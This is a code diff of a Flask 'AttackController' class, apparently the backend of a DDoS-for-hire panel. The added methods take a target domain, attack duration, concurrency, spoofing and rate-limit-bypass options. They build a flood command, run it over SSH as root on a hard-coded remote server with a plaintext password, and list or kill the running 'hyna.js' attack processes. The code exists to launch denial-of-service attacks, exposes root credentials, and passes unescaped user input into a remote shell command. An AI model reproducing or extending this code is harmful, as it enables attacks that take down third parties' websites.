@@ -155,7 +155,7 @@ class AttackController:
         return successfulServers, errors
 
     def attack(self):
-        
+
         clientIp = request.remote_addr
         if clientIp not in WHITELISTED_IPS:
             return jsonify({
@@ -451,3 +451,102 @@ class AttackController:
             "status": "success",
             "data": logDict
         }), 200
+
+    def start_process(self):
+        try:
+            payload = request.get_json()
+            domainName = payload.get('domain')
+            attackTimeValue = payload.get('attack_time')
+            bypassRateLimitValue = str(payload.get('bypass_ratelimit')).lower()
+            coreStrengthValue = payload.get('core_strength')
+            modeValue = payload.get('mode')
+            concurrentValue = payload.get('concurrents')
+            requestCount = payload.get('request')
+            spoof = payload.get('spoof', '')
+            death_sword_http = payload.get('death_sword_http', '')
+            death_sword_http = str(death_sword_http) if death_sword_http is not None else ""
+            typeAttack = payload.get('typeAttack')
+
+            command = f'{modeValue} {domainName} {attackTimeValue} {concurrentValue} {requestCount} {coreStrengthValue} --debug true --bypass true --auth true {death_sword_http} {spoof} --debug true --ratelimit {bypassRateLimitValue}'
+
+            sshClient = paramiko.SSHClient()
+            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            sshClient.connect("209.127.245.174", username="root", password="ZPeZDMGmh6K0xt0i")
+
+            stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[x]vfb'")
+            process_list = stdout.read().decode().strip().split("\n")
+
+            sshClient.exec_command("pkill -9 xvfb-run; pkill -9 Xvfb")
+            sshClient.exec_command(command)
+            sshClient.close()
+
+            return jsonify({ "status": "success" }), 200
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 400
+
+    def list_processes(self):
+        try:
+            sshClient = paramiko.SSHClient()
+            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            sshClient.connect("209.127.245.174", username="root", password="ZPeZDMGmh6K0xt0i")
+            
+            stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[h]yna.js' | awk '$8 ~ /^Rl/ {print $0}'")
+            raw_process_list = stdout.read().decode().strip().split("\n")
+            sshClient.close()
+
+            process_list = []
+            for process in raw_process_list:
+                parts = process.split(maxsplit=15)
+                if len(parts) < 11:
+                    continue
+
+                process_info = {
+                    "origin_data": process,
+                    "domain": parts[12],
+                    "attack_time": parts[8],
+                    "remaining_time": parts[9],
+                    "concurrents": int(parts[14]),
+                    "pid": int(parts[1])
+                }
+                process_list.append(process_info)
+
+            return jsonify({"status": "success", "data": process_list}), 200
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 400
+
+    def stop_process(self, pid):
+        try:
+            if not isinstance(pid, int) or pid <= 0:
+                return jsonify({"error": "Invalid PID"}), 400
+
+            sshClient = paramiko.SSHClient()
+            sshClient.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+            sshClient.connect("209.127.245.174", username="root", password="ZPeZDMGmh6K0xt0i")
+            
+            command = f"kill -9 {pid}"
+            sshClient.exec_command(command)
+
+            stdin, stdout, stderr = sshClient.exec_command("ps aux | grep '[h]yna.js' | awk '$8 ~ /^Rl/ {print $0}'")
+            raw_process_list = stdout.read().decode().strip().split("\n")
+
+            process_list = []
+            for process in raw_process_list:
+                parts = process.split(maxsplit=15)
+                if len(parts) < 11:
+                    continue
+
+                process_info = {
+                    "origin_data": process,
+                    "domain": parts[12],
+                    "attack_time": parts[8],
+                    "remaining_time": parts[9],
+                    "concurrents": int(parts[14]),
+                    "pid": int(parts[1])
+                }
+                process_list.append(process_info)
+
+            sshClient.close()
+
+            return jsonify({"status": "success", "data": process_list}), 200
+        except Exception as e:
+            return jsonify({"status": "error", "message": str(e)}), 400
